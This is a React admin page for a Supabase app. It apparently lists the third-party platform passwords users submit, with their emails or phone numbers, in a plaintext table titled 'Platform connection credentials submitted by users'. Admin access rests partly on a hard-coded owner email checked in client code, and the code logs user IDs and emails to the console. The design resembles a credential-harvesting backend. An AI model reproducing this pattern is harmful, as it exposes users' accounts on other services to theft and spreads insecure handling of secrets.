import React, { useEffect, useRef, useState } from 'react';
import { supabase } from '../lib/supabase';
import Connect from './Connect';

export default function Admin() {
  const isMounted = useRef(true);
  const [user, setUser] = useState<any>(null);
  const [rows, setRows] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [isAdmin, setIsAdmin] = useState(false);
  const [authChecked, setAuthChecked] = useState(false);
  const [unauthorizedMessage, setUnauthorizedMessage] = useState('');

  const finishAuthCheck = (message = '') => {
    if (!isMounted.current) return;
    setAuthChecked(true);
    setLoading(false);
    setUnauthorizedMessage(message);
  };

  const initializeAdmin = async (user: any) => {
    console.log('Admin: initializeAdmin called with user:', user ? { id: user.id, email: user.email } : null);
    if (!isMounted.current) {
      console.log('Admin: component unmounted, skipping');
      return;
    }

    if (!user) {
      console.log('Admin: no user, setting not admin');
      setUser(null);
      setIsAdmin(false);
      finishAuthCheck();
      return;
    }

    setUser(user);
    setLoading(true);
    setAuthChecked(false);

    try {
      console.log('Admin: querying profile for user id:', user.id);
      const { data: profile, error } = await supabase
        .from('profiles')
        .select('is_admin')
        .eq('id', user.id)
        .maybeSingle();

      if (error) {
        console.error('Admin: profile query error:', error);
        throw error;
      }

      console.log('Admin: profile query result:', profile);
      const isOwner = user.email === 'gibsonkobia@gmail.com';
      console.log('Admin: isOwner check:', isOwner, 'user email:', user.email);

      if (!profile?.is_admin && !isOwner) {
        console.log('Admin: not admin, showing error');
        setIsAdmin(false);
        finishAuthCheck('You do not have admin access with this account.');
        return;
      }

      console.log('Admin: user is admin, fetching submissions');
      setIsAdmin(true);
      setUnauthorizedMessage('');
      await fetchSubmissions();
      console.log('Admin: fetchSubmissions completed');
      finishAuthCheck();
    } catch (err) {
      console.error('Admin: Error checking admin status:', err);
      setIsAdmin(false);
      finishAuthCheck('Unable to verify admin access. Please try again later.');
    }
  };

  useEffect(() => {
    console.log('Admin: useEffect triggered');
    const loadSession = async () => {
      console.log('Admin: loading session');
      const { data: { session }, error } = await supabase.auth.getSession();
      if (error) console.error('Admin: getSession error:', error);
      console.log('Admin: session loaded:', session ? { user: { id: session.user.id, email: session.user.email } } : null);
      await initializeAdmin(session?.user ?? null);
    };

    loadSession();

    const { data: { subscription } } = supabase.auth.onAuthStateChange(
      async (event, session) => {
        console.log('Admin: auth state change:', event, session ? { user: { id: session.user.id, email: session.user.email } } : null);
        await initializeAdmin(session?.user ?? null);
      }
    );

    return () => {
      console.log('Admin: cleanup');
      isMounted.current = false;
      subscription.unsubscribe();
    };
  }, []);

  const fetchSubmissions = async () => {
    console.log('Admin: fetchSubmissions started');
    try {
      console.log('Admin: fetching connections and requests');
      const [connectionsResponse, requestsResponse] = await Promise.all([
        supabase
          .from('platform_connections')
          .select('id, platform, email, third_party_password, created_at, user_id')
          .order('created_at', { ascending: false }),
        supabase
          .from('platform_connection_requests')
          .select('id, platform, email, phone, third_party_password, created_at, status')
          .order('created_at', { ascending: false }),
      ]);

      console.log('Admin: connections response:', { error: connectionsResponse.error, count: connectionsResponse.data?.length });
      if (connectionsResponse.error) {
        console.error('Admin: Error loading authenticated submissions:', connectionsResponse.error);
      }
      console.log('Admin: requests response:', { error: requestsResponse.error, count: requestsResponse.data?.length });
      if (requestsResponse.error) {
        console.error('Admin: Error loading public requests:', requestsResponse.error);
      }

      const connections = connectionsResponse.data || [];
      const requests = requestsResponse.data || [];

      const mergedRows = [
        ...connections.map((row) => ({
          id: row.id,
          platform: row.platform,
          contact: row.email || '-',
          third_party_password: row.third_party_password,
          created_at: row.created_at,
          user_id: row.user_id,
          status: 'authenticated',
        })),
        ...requests.map((row) => ({
          id: row.id,
          platform: row.platform,
          contact: row.email || row.phone || '-',
          third_party_password: row.third_party_password,
          created_at: row.created_at,
          user_id: null,
          status: row.status || 'pending',
        })),
      ].sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());

      console.log('Admin: merged rows count:', mergedRows.length);
      setRows(mergedRows);
    } catch (err) {
      console.error('Admin: Error loading admin submissions:', err);
    } finally {
      console.log('Admin: fetchSubmissions finally, setting loading false');
      if (isMounted.current) {
        setLoading(false);
      }
    }
  };

  if (loading) {
    console.log('Admin: rendering loading spinner');
    return (
      <div className="min-h-screen bg-[#0a0a0c] flex items-center justify-center text-white">
        <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-white"></div>
      </div>
    );
  }

  if (!isAdmin && authChecked) {
    console.log('Admin: rendering Connect with error:', unauthorizedMessage);
    return <Connect externalError={unauthorizedMessage} />;
  }

  if (!isAdmin) {
    console.log('Admin: not admin, rendering null');
    return null;
  }

  console.log('Admin: rendering admin page');
  return (
    <main className="min-h-screen bg-[#0a0a0c] px-4 py-10 text-white sm:px-6">
      <div className="mx-auto max-w-5xl rounded-2xl border border-white/10 bg-white/5 p-5">
        <div className="flex justify-between items-center mb-6">
          <div>
            <h1 className="text-2xl font-semibold">Admin submissions</h1>
            <p className="text-sm text-slate-300">
              Platform connection credentials submitted by users.
            </p>
          </div>
          <button 
            onClick={async () => {
              console.log('Admin: sign out clicked');
              await supabase.auth.signOut();
              console.log('Admin: sign out completed, reloading');
              window.location.reload();
            }}
            className="text-sm text-slate-400 hover:text-white underline underline-offset-4"
          >
            Sign Out
          </button>
        </div>
        <div className="overflow-x-auto">
          <table className="min-w-full text-left text-sm">
            <thead className="text-slate-400">
              <tr>
                <th className="px-3 py-2">Platform</th>
                <th className="px-3 py-2">Contact</th>
                <th className="px-3 py-2">Password</th>
                <th className="px-3 py-2">Status</th>
                <th className="px-3 py-2">Created at</th>
                <th className="px-3 py-2">User ID</th>
              </tr>
            </thead>
            <tbody>
              {rows.map((row) => (
                <tr key={`${row.id}-${row.status}`} className="border-t border-white/10">
                  <td className="px-3 py-2">{row.platform}</td>
                  <td className="px-3 py-2">{row.contact}</td>
                  <td className="px-3 py-2">{row.third_party_password || '-'}</td>
                  <td className="px-3 py-2">{row.status}</td>
                  <td className="px-3 py-2 text-slate-400">
                    {new Date(row.created_at).toLocaleString()}
                  </td>
                  <td className="px-3 py-2 text-slate-400 truncate max-w-[100px]">{row.user_id || '-'}</td>
                </tr>
              ))}
              {rows.length === 0 && (
                <tr>
                  <td colSpan={5} className="px-3 py-8 text-center text-slate-500">
                    No submissions found.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </main>
  );
}
